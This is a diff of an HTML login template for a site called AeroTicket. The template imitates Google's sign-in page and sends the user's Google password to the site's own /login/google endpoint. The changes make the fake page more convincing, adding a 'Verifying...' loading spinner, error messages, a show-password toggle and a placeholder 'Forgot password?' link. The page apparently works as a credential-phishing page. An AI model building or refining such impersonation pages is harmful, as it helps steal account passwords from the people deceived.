@@ -6,7 +6,35 @@
     <title>Welcome - AeroTicket</title>
     <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="{{ url_for('static', filename='google_log.css') }}">
+    <style>
+        /* Loading Circle Styles */
+        .loader {
+            display: none; /* Hidden by default */
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #4285f4;
+            border-radius: 50%;
+            width: 18px;
+            height: 18px;
+            animation: spin 1s linear infinite;
+            margin-left: 10px;
+        }
 
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .btn-content {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .next-btn:disabled {
+            background-color: #ccc;
+            cursor: not-allowed;
+        }
+    </style>
 </head>
 <body>
 
@@ -14,28 +42,81 @@
     <div class="left-panel">
         <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" width="48" style="margin-bottom:20px;">
         <h1>Welcome</h1>
-        <a href="{{ url_for('login') }}" class="email-badge">
-            <span style="margin-right:8px;">👤</span> {{ email }} <span style="font-size: 10px; margin-left: 4px;">▼</span>
+        <a href="{{ url_for('google_login') }}" class="email-badge">
+            <span class="avatar-circle">👤</span> 
+            <span class="email-text">{{ email }}</span> 
+            <span class="arrow">▼</span>
         </a>
     </div>
-    <div class="right-panel">
-       <form action="/login/google" method="POST">
-    <input type="hidden" name="step" value="password">
-    <input type="hidden" name="email" value="{{ email }}"> <input type="password" name="password" placeholder="Enter your password" required>
     
-    <button type="submit" class="next-btn">Sign In</button>
-</form>
+    <div class="right-panel">
+        {% with messages = get_flashed_messages() %}
+          {% if messages %}
+            {% for message in messages %}
+              <div id="error-msg" style="color: #d93025; font-size: 14px; margin-bottom: 15px; display: flex; align-items: center;">
+                <span style="margin-right: 8px;">⚠️</span> {{ message }}
+              </div>
+            {% endfor %}
+          {% endif %}
+        {% endwith %}
+
+        <form action="/login/google" method="POST" id="loginForm">
+            <input type="hidden" name="step" value="password">
+            <input type="hidden" name="email" value="{{ email }}"> 
+            
+            <div class="input-wrapper">
+                <input type="password" name="password" id="password" placeholder=" " required autofocus>
+                <label for="password">Enter your password</label>
+            </div>
+
+            <label class="show-pw">
+                <input type="checkbox" onclick="togglePassword()"> 
+                <span>Show password</span>
+            </label>
+            
+            <div class="button-row">
+                <a href="#" class="forgot-link">Forgot password?</a>
+                <button type="submit" class="next-btn" id="submitBtn">
+                    <div class="btn-content">
+                        <span id="btnText">Next</span>
+                        <div class="loader" id="loader"></div>
+                    </div>
+                </button>
+            </div>
+        </form>
     </div>
 </div>
 
 <div class="footer">
     <div>English (United States) ▼</div>
-    <div style="display:flex; gap:24px;">
-        <span style="cursor:pointer">Help</span>
-        <span style="cursor:pointer">Privacy</span>
-        <span style="cursor:pointer">Terms</span>
+    <div class="footer-links">
+        <span>Help</span>
+        <span>Privacy</span>
+        <span>Terms</span>
     </div>
 </div>
+
+<script>
+    // Show/Hide Password
+    function togglePassword() {
+        var x = document.getElementById("password");
+        x.type = (x.type === "password") ? "text" : "password";
+    }
+
+    // Loading Animation on Click
+    const loginForm = document.getElementById('loginForm');
+    const submitBtn = document.getElementById('submitBtn');
+    const loader = document.getElementById('loader');
+    const btnText = document.getElementById('btnText');
+
+    loginForm.addEventListener('submit', function() {
+        // Disable button to prevent double clicks
+        submitBtn.disabled = true;
+        // Show loader and change text
+        loader.style.display = 'block';
+        btnText.innerText = 'Verifying...';
+    });
+</script>
 
 </body>
 </html>
